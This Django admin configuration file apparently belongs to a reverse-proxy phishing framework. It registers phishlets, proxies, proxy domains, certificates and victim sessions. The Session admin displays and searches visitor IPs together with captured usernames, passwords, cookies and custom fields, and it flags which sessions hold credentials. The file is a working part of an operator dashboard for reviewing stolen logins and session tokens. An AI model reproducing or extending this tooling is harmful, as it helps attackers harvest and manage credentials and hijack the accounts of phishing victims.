from django.contrib import admin
from .models import Phishlet, Proxy, DNSSettings, ProxyDomain, DomainCertificate, Session


@admin.register(Phishlet)
class PhishletAdmin(admin.ModelAdmin):
    list_display = ("name", "is_active", "is_cache_enabled", "proxy_auth", "proxy", "updated_at")
    list_filter = ("is_active", "is_cache_enabled", "proxy")
    search_fields = ("name", "proxy_auth")
    readonly_fields = ("created_at", "updated_at")
    fieldsets = (
        (None, {"fields": ("name", "is_active", "is_cache_enabled", "proxy_auth", "proxy")}),
        ("Content", {"fields": ("data",)}),
        ("Timestamps", {"fields": ("created_at", "updated_at")}),
    )


@admin.register(Proxy)
class ProxyAdmin(admin.ModelAdmin):
    list_display = ("name", "proxy_type", "host", "port", "is_active", "has_auth", "updated_at")
    list_filter = ("proxy_type", "is_active")
    search_fields = ("name", "host")
    readonly_fields = ("created_at", "updated_at")
    fieldsets = (
        (None, {"fields": ("name", "proxy_type", "host", "port", "is_active")}),
        ("Authentication", {"fields": ("username", "password")}),
        ("Timestamps", {"fields": ("created_at", "updated_at")}),
    )
    
    def has_auth(self, obj):
        return bool(obj.username and obj.password)
    has_auth.boolean = True
    has_auth.short_description = "Has Auth"


@admin.register(Session)
class SessionAdmin(admin.ModelAdmin):
    list_display = (
        "get_short_session_id", 
        "phishlet", 
        "proxy_domain", 
        "visitor_ip", 
        "has_credentials", 
        "is_captured",
        "is_proxy_auth",
        "is_active", 
        "created"
    )
    list_filter = (
        "is_active", 
        "is_captured",
        "phishlet", 
        "proxy_domain", 
        "created", 
        "updated"
    )
    search_fields = (
        "session_cookie", 
        "visitor_ip", 
        "proxy_domain", 
        "phishlet__name",
        "captured_username",
        "captured_password"
    )
    readonly_fields = (
        "session_cookie", 
        "phishlet", 
        "proxy_domain", 
        "visitor_ip", 
        "user_agent", 
        "is_captured",
        "created", 
        "updated"
    )
    fieldsets = (
        ("Session Info", {
            "fields": ("session_cookie", "phishlet", "proxy_domain", "is_active", "is_captured", "is_proxy_auth")
        }),
        ("Visitor Info", {
            "fields": ("visitor_ip", "user_agent")
        }),
        ("Captured Data", {
            "fields": ("captured_username", "captured_password", "captured_cookies", "captured_custom"),
            "classes": ("collapse",)
        }),
        ("Timestamps", {
            "fields": ("created", "updated"),
            "classes": ("collapse",)
        }),
    )
    
    def get_short_session_id(self, obj):
        return obj.get_short_session_id()
    get_short_session_id.short_description = "Session ID"
    get_short_session_id.admin_order_field = "session_cookie"
    
    def has_credentials(self, obj):
        return bool(obj.captured_username or obj.captured_password)
    has_credentials.boolean = True
    has_credentials.short_description = "Has Credentials"
    
    def get_queryset(self, request):
        return super().get_queryset(request).select_related('phishlet')


# Register your models here.


@admin.register(DNSSettings)
class DNSSettingsAdmin(admin.ModelAdmin):
    list_display = ("dns_port", "updated_at")
    readonly_fields = ("created_at", "updated_at")
    fieldsets = (
        (None, {"fields": ("dns_port",)}),
        ("Timestamps", {"fields": ("created_at", "updated_at")}),
    )


@admin.register(ProxyDomain)
class ProxyDomainAdmin(admin.ModelAdmin):
    list_display = ("hostname", "is_active", "updated_at")
    list_filter = ("is_active",)
    search_fields = ("hostname",)
    readonly_fields = ("created_at", "updated_at")


@admin.register(DomainCertificate)
class DomainCertificateAdmin(admin.ModelAdmin):
    list_display = ("domain", "updated_at")
    search_fields = ("domain__hostname",)
    readonly_fields = ("created_at", "updated_at")
